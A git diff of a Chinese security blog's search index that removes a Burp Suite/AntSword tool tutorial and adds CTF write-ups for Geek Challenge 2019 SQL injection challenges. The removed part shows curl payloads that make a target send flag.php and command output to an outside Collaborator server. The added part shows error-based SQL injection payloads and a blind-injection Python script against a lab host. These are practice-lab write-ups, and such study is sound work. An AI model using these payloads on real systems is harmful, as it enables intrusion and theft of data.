@@ -8073,167 +8073,6 @@
       </tags>
   </entry>
   <entry>
-    <title>关于web基础工具的使用</title>
-    <url>/2024/12/01/%E5%85%B3%E4%BA%8Eweb%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>出一期对基础工具的使用，不仅限于对蚁剑，burpsuite，sqlmap以及一些扫描目录和扫描漏洞工具的使用，看自己能写多少吧，只能说尽量去积累</p>
-<h1 id="0x02正题"><a href="#0x02正题" class="headerlink" title="0x02正题"></a>0x02正题</h1><h2 id="burpsuite-2024版"><a href="#burpsuite-2024版" class="headerlink" title="burpsuite(2024版)"></a>burpsuite(2024版)</h2><p>burpsuite是用于攻击web应用程序的集成平台，其中包含了很多工具，并且为这些工具设计了很多的接口，这样可以加快我们攻击应用程序的过程</p>
-<p>我们先来看看基础的标签有哪些以及他们代表的模块</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201112016424.png" alt="image-20241201112016424"></p>
-<ul>
-<li>代理模块(proxy):是用于拦截和修改http或者https请求和响应的模块，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。有时候可以对服务器造成一定的攻击损害</li>
-</ul>
-<p>这个模块里面有intercrpt，HTTP history，match and replace这几种</p>
-<p>1.intercrpt选项</p>
-<p>intercept是拦截的意思，在这里相当于拦截请求，可以实时的对请求进行拦截，然后请求参数的篡改，再把请求放通，从而达到实时修改请求的功能</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201112951842.png" alt="image-20241201112951842"></p>
-<p>我们打开intercrpt功能后可以拦截我们代理浏览器上的http请求(如果是HTTPS的话需要手动配置)通过forward(放包)或者drop(丢弃)来决定我们是否要发包，request的内容就是我们的请求包</p>
-<p>2.HTTP history</p>
-<p>在这里的话我们可以看到我们代理服务器之前接收到的http请求</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201113751898.png" alt="image-20241201113751898"></p>
-<p>这里还有过滤器，通过过滤器我们可以筛选到自己想要的内容</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201114205502.png" alt="image-20241201114205502"></p>
-<p>3.Websockets history(很少用)</p>
-<p>该功能和HTTP history十分类似，实际中很少用到</p>
-<p>4.Match and Replace(很少用)</p>
-<p>功能用于拦截和修改HTTP请求和响应中的内容</p>
-<ul>
-<li>目标模块(target):用于设置测试目标，并让Burp Suite扫描目标应用程序以发现漏洞。</li>
-</ul>
-<p>这个模块包括sitemap，scope两个选项</p>
-<p>1.sitemap(站点地图)</p>
-<p>SiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请 求的URL 。 基于左边的树形结构，我们可以选择某个分支，对指定的路径进行扫描和抓取。</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201150941749.png" alt="image-20241201150941749"></p>
-<p>左边一栏为你的流量信息，也就是包含着我们所请求的流量,顶上一栏是我们具体请求的内容，最大的一栏就不用多说了，是我们具体的一些request包和response包</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201151216903.png" alt="image-20241201151216903"></p>
-<p>2.scope</p>
-<p>Target Scope中作用域的定义比较宽泛，通常来说，当我们对某个产品进行渗透测试时，可以通过域名或者主机名去限制拦截内容，这里域名或主机名就是我们说的作用域；如果我们想限制得更为细粒度化，比如，你只想拦截login目录下的所有请求，这时我们也可以在此设置，此时，作用域就是目录。总体来说，Target Scope主要使用于下面几种场景中：</p>
-<ul>
-<li>限制站点地图和Proxy 历史中的显示结果</li>
-<li>告诉Burp Proxy 拦截哪些请求</li>
-<li>Burp Spider抓取哪些内容</li>
-<li>Burp Scanner自动扫描哪些作用域的安全漏洞</li>
-<li>在Burp Intruder和Burp Repeater 中指定URL</li>
-</ul>
-<p>通过Target Scope 我们能方便地控制Burp 的拦截范围、操作对象，减少无效的噪音。在Target Scope的设置中，主要包含两部分功能：允许规则和去除规则。</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/d4838bb2c7f66fe201c1ce5f134bb48b.png" alt="img"></p>
-<ul>
-<li>响应模块(Repeater):用于显示请求和响应的详细信息，包括HTTP头和正文。</li>
-</ul>
-<p>Burp Suite的响应模块用于显示请求和响应的详细信息，包括HTTP头和正文。用户可以使用此模块来查看已拦截的请求和响应，以了解应用程序如何响应不同类型的攻击。</p>
-<p>在这个模块里，我们可以更方便的进行发包和看包，如果只是在proxy模块里面的话我们就只能修改包并不能完整的看到我们想要的response回显数据包的内容，所以我们一般拿bp进行测试的时候往往都会将包发送到repeater模块</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201152049396.png" alt="image-20241201152049396"></p>
-<p>我们在这里选择我们想要的请求，然后就可以发送到repeater模块了</p>
-<ul>
-<li>爆破模块(Intruder)：用于发送请求的多个副本，以测试目标服务器的响应是否相同。也就是我们经常说的爆破</li>
-</ul>
-<p>Burp Suite的重复模块用于发送请求的多个副本，以测试目标服务器的响应是否相同。这是一种非常有用的测试技术，因为它可以帮助用户确定目标应用程序是否容易受到重复攻击的影响。</p>
-<p>举个例子:</p>
-<p>web入门的27题爆破题</p>
-<p>打开靶机，发现是个登录页面，需要学号和密码登录，猜测登录后可获得flag，则可围绕获得学号密码来进行，因为两者都不知道，直接爆破不太合适，看看还能提取到什么信息。</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/1c0c94f0642b40feac756cade867a00c-1730818268343-18.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>当点击到登录按钮下方的录取名单时，自动下载了一个list.xlsx，打开这个文件，发现了几个人的姓名和身份证号部分信息。点击录取名单下面的学生学籍信息查询系统，发现可以根据学生姓名和身份证号进行录取查询，那么第一步要做的可能就是要爆破身份证号了，或许在这里可以查到有用的信息。</p>
-<p>以下载的表格的第一个人为例，录取查询页面姓名栏输入高先伊，身份证输入6210225237</p>
-<ul>
-<li>打开抓包工具，如Burpsuit，点击查询，抓到查询发送的请求包，将请求包发送至Intruder攻击模块，将请求包中的&amp;p设置为变量</li>
-</ul>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/4cb7a0f41b8f4aa7b7fa7fc37173188c-1730818272849-22.png" alt="img"></p>
-<ul>
-<li>设置payload</li>
-</ul>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/7f96d063ce374500bb095fd466a98b6b.png" alt="img"></p>
-<p>format那栏一定要写yyyyMMdd对应身份证的年月日，然后就开始爆破</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/a34dace7731241758d97f01c2f99847e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>爆破后找到长度最长的response，可以看到有success，把下面那串编码复制拿去翻译一下</p>
-<p>Unicode-str解码: 恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</p>
-<p>然后我们就尝试登录一下，就可以拿到flag了</p>
-<p>我们逐个讲解</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201152554962.png" alt="image-20241201152554962"></p>
-<p>在这里，我们需要设置我们的爆破点和爆破模式，爆破点的话就是在我们需要爆破的地方添加起止符号就行，我们重点讲一下爆破模式</p>
-<p>burpsuite爆破的四种模式</p>
-<p>四种模式分别为：Sniper、Battering ram、Pitchfork、 Cluster bomb(推荐使用)</p>
-<p>1.Sniper(狙击手)</p>
-<p>作为比较常用的模式，Sniper的作用是对其中选定的参数一个一个依次遍历字典并且替换然后测试。sniper只能默认对第一个参数进行修改，而无法对两个参数同时进行爆破。</p>
-<p>2.Battering ram(攻城锤)</p>
-<p>不同于sniper，Battering ram是两个参数同时进行遍历一个字典的</p>
-<p>3.Pitchfork(草叉模式)</p>
-<p>Pitchfork作为多字典，他的特点也非常明显，就是多个字典同时进行，与Battering ram有些相似之处，但是一个是多个人跑一个赛道，而一个是多个人，各有各的赛道。</p>
-<p>4.Cluster bomb(集束炸弹)(推荐爆破时使用)</p>
-<p>Cluster bomb兼备了前面三种模式的所有的功能，那就是全部遍历，不放过所有情况，但是在超大字典的情况下，运算能力就限制了Cluster bomb模式的发挥，所以只要算力足够，那爆破出密码就不是问题。</p>
-<p>然后我们讲一下设置payload</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201152822436.png" alt="image-20241201152822436"></p>
-<p>这里的话有设置payload的类型和个数</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201152848332.png" alt="image-20241201152848332"></p>
-<p>然后就是导入我们的字典之类的，步骤很简单，如果没有字典的话可以去多收集一下，网上的还是很丰富的</p>
-<p>关于那个payload processing的话，可以理解为在发送请求前对payload进行一定的设定，比如加密，编码什么的</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/661a2625550112f0cc21e28808ea25d5.png" alt="img"></p>
-<p>讲几个比较常用的</p>
-<p>Add Prefix：添加一个文字前缀</p>
-<p>Add suffix：添加一个文字后缀</p>
-<p>Match&#x2F;replace：将替换匹配的正则表达式</p>
-<p>Substring：截取字符串的长度0开始</p>
-<p>Reverse substring：倒着匹配字符串</p>
-<p>接着就是是否需要进行url的编码解码，也就是我们最底下的内容</p>
-<p>然后我们讲一下设置爆破的线程数及请求间隔，如果有时候爆破的量很大的话可以去添加多个线程</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241201153241740.png" alt="image-20241201153241740"></p>
-<p>默认的话都是10个线程，你们可以试一下</p>
-<ul>
-<li>Collaborator</li>
-</ul>
-<p>这个的话就是bp内置的一个服务器了，如果我们有些题需要用到远程服务器去进行外带</p>
-<p>我们讲一下web133里面的一个解法就是用到了</p>
-<p>题目</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong><code>@</code> 符号</strong>:</p>
-<ul>
-<li>这是 PHP 的错误抑制运算符。使用 <code>@</code> 运算符可以抑制表达式中可能出现的任何错误或警告。</li>
-</ul>
-<p>这道题限制了参数的字符串长度，还对参数进行了一些函数的过滤</p>
-<p>这里可以注意到eval函数里面有一个substr函数，说明会截取这个$F参数的前六位作为php代码去执行，但是因为这里限制了很多函数，且还有长度限制，这时候我们有一个新思路，就是通过传递参数本身实现变量覆盖，但是我们这里是讲解基础工具的使用，所以我们讲这么进行外带</p>
-<p>curl 外带</p>
-<p>“curl” 命令是一个在命令行下使用的工具，用于传输数据</p>
-<p>curl的相关命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-F参数用来向服务器传输二进制文件，-X参数用来指定http代理</span><br></pre></td></tr></table></figure>
-
-<p>我们需要通过curl让目标服务器向我们的服务器发送我们想要的东西，这里的服务器我们可以用burp的服务器Collaborator服务器</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`;+curl -X POST -F xx=@flag.php  服务器地址</span><br></pre></td></tr></table></figure>
-
-<p>对 payload 的一些解释：</p>
-<p>-F 为带文件的形式发送 post 请求；</p>
-<p>其中 xx 是上传文件的 name 值，我们可以自定义的，而 flag.php 就是上传的文件 ；</p>
-<p><strong>相当于让服务器向 Collaborator 客户端发送 post 请求，内容是flag.php。</strong></p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241118105607463-1731898571388-1.png" alt="image-20241118105607463"></p>
-<p>也可以进行命令执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`; curl 服务器地址/`ls`</span><br></pre></td></tr></table></figure>
-
-<p>命令的输出将被插入到 curl 命令的 URL 中 </p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241118105850560.png" alt="image-20241118105850560"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`; curl 服务器地址/`cat flag.php|grep ctfshow`</span><br></pre></td></tr></table></figure>
-
-<p>因为 flag.php 内容是多行，所以结合 grep 找一下。整体来说，这个命令企图读取服务器上 <code>flag.php</code> 文件中包含 <code>ctfshow</code> 的行，然后将该行的内容作为 URL 的一部分发送到指定的外部服务器。</p>
-<p><img src="/./../image/achieve/202411/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/image-20241118110005583.png" alt="image-20241118110005583"></p>
-<p>其他的几个模块因为用的少所以我就不细说了，后面用到了再回来补充</p>
-<ol>
-<li>Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</li>
-<li>Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</li>
-<li>Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</li>
-<li>Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。</li>
-<li>Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</li>
-<li>Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</li>
-<li>Options(设置)——对Burp Suite的一些设置。</li>
-</ol>
-<h2 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h2><p>蚁剑(AntSword)是一款开源的跨平台WebShell管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。</p>
-<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>dirsearch -u “url” -e*</p>
-]]></content>
-      <categories>
-        <category>基础</category>
-      </categories>
-      <tags>
-        <tag>基础工具的使用</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>国城杯web方向wp</title>
     <url>/2024/12/10/%E5%9B%BD%E5%9F%8E%E6%9D%AFweb%E6%96%B9%E5%90%91wp/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -10300,12 +10139,12 @@
 <p>Authorization		HTTP受权的受权证书			Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</p>
 <p>Cache-Control		指定请求和响应遵循的缓存机制	Cache-Control: max-age&#x3D;0</p>
 <p>Connection		表示是否须要持久链接。（HTTP 1.1默认进行持久链接）	Connection: keep-alive</p>
-<p>Cookie			HTTP请求发送时，会把保存在该请求域名下的全部cookie值一块儿发送给web服务器。	Cookie: OUTFOX_SEARCH_USER_ID&#x3D;<a href="mailto:&#50;&#x38;&#x30;&#x33;&#x39;&#x32;&#x32;&#48;&#55;&#64;&#49;&#x30;&#46;&#x31;&#49;&#48;&#x2e;&#57;&#54;&#x2e;&#x31;&#x35;&#56;">&#50;&#x38;&#x30;&#x33;&#x39;&#x32;&#x32;&#48;&#55;&#64;&#49;&#x30;&#46;&#x31;&#49;&#48;&#x2e;&#57;&#54;&#x2e;&#x31;&#x35;&#56;</a></p>
+<p>Cookie			HTTP请求发送时，会把保存在该请求域名下的全部cookie值一块儿发送给web服务器。	Cookie: OUTFOX_SEARCH_USER_ID&#x3D;<a href="mailto:&#x32;&#x38;&#48;&#x33;&#x39;&#x32;&#50;&#48;&#x37;&#64;&#x31;&#x30;&#46;&#49;&#49;&#48;&#46;&#57;&#54;&#46;&#49;&#x35;&#x38;">&#x32;&#x38;&#48;&#x33;&#x39;&#x32;&#50;&#48;&#x37;&#64;&#x31;&#x30;&#46;&#49;&#49;&#48;&#46;&#57;&#54;&#46;&#49;&#x35;&#x38;</a></p>
 <p>Content-Length	请求的内容长度	Content-Length: 348</p>
 <p>Content-Type		请求的与实体对应的MIME信息		Content-Type: application&#x2F;json;charset&#x3D;UTF-8</p>
 <p>Date			请求发送的日期和时间				Date: Tue, 15 Nov 2010 08:12:31 GMT</p>
 <p>Expect			请求的特定的服务器行为			Expect: 100-continue</p>
-<p><strong>From			发出请求的用户的Email				From: <a href="mailto:&#117;&#x73;&#x65;&#x72;&#x40;&#x65;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;">&#117;&#x73;&#x65;&#x72;&#x40;&#x65;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a></strong></p>
+<p><strong>From			发出请求的用户的Email				From: <a href="mailto:&#117;&#115;&#x65;&#114;&#x40;&#x65;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#117;&#115;&#x65;&#114;&#x40;&#x65;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a></strong></p>
 <p>Host				指定请求的服务器的域名和端口号	Host: <a href="http://www.baidu.com/">www.baidu.com</a></p>
 <p>If-Match			只有请求内容与实体相匹配才有效		If-Match: “737060cd8c284d8af7ad3082f209582d”</p>
 <p>If-Modified-Since	若是请求的部分在指定时间以后被修改则请求成功，未被修改则返回304代码	If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</p>
@@ -10410,8 +10249,16 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; oorrder bbyy 4#出错，字段数为3</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,3#回显位置为2和3</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,database()#数据库名为geek</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;)#表名为b4bsql,geekuser</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;)#列名为id,username,password</span><br><span class="line">-1&#x27; ununionion seselectlect 1,2,(seselectlect passwoorrd frfromom geek.b4bsql whwhereere username=&#x27;flag&#x27;)#</span><br></pre></td></tr></table></figure>
 
 <h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250121124832767.png" alt="image-20250121124832767"></p>
-<p>这次双写和大小写都没能绕过去</p>
+<p>可以用报错注入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(database())),0x7e),3))#</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~geek~<span class="string">&#x27;</span></span><br><span class="line"><span class="string">空格被过滤了，我们用括号去绕过</span></span><br><span class="line"><span class="string">-1&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)where(table_schema)like(database())),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~H4rDsq1~&#x27;</span></span><br><span class="line">等于号也被过滤了</span><br><span class="line"></span><br><span class="line">-<span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~<span class="built_in">id</span>,username,password~<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(password))<span class="keyword">from</span>(H4rDsq1)where(username)like(<span class="string">&#x27;flag&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~flag&#123;e6f22b98-2bd0-4db8-9083-af&#x27;</span></span><br><span class="line">漏了一部分flag，我们用right函数去拿</span><br><span class="line"></span><br><span class="line">-<span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,14))from(H4rDsq1)where(username)like(&#x27;</span>flag<span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string">忘记复制粘贴了.....</span></span><br></pre></td></tr></table></figure>
+
 <h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250121011804340.png" alt="image-20250121011804340"></p>
+<p>分别点击那几个数字之后没啥可用的信息，但是我们在url中发现id参数，可以fuzz，测出<code>^</code>符号可以使用，可以试试盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1^(length(database())&gt;1)页面返回error</span><br></pre></td></tr></table></figure>
+
+<p>能打那就直接上脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://968a873e-bab6-4c98-89f0-71a63e1d8708.node5.buuoj.cn:81/search.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">f&quot;?id=1^(ascii(substr((Select(group_concat(password))from(F1naI1y)where(username=&#x27;flag&#x27;)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>)--+&quot;</span></span><br><span class="line">        r=requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(flag))</span><br></pre></td></tr></table></figure>
+
 <h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开页面</p>
 <p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111173046086-1731317448508-15.png" alt="image-20241111173046086"></p>
 <p>查看页面源代码发现一段隐藏代码</p>
@@ -10536,6 +10383,9 @@
 
 <p>上传后进行访问，用蚁剑进行连接，但发现readflag无法读取，权限设置也读不了，这时候可以用蚁剑的插件</p>
 <p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111204701806-1731329222948-55.png" alt="image-20241111204701806"></p>
+<p>然后</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250121173054824.png" alt="image-20250121173054824"></p>
+<p>可以看到终端出来了，我们直接&#x2F;readflag就可以拿到flag了</p>
 ]]></content>
       <categories>
         <category>赛题wp</category>
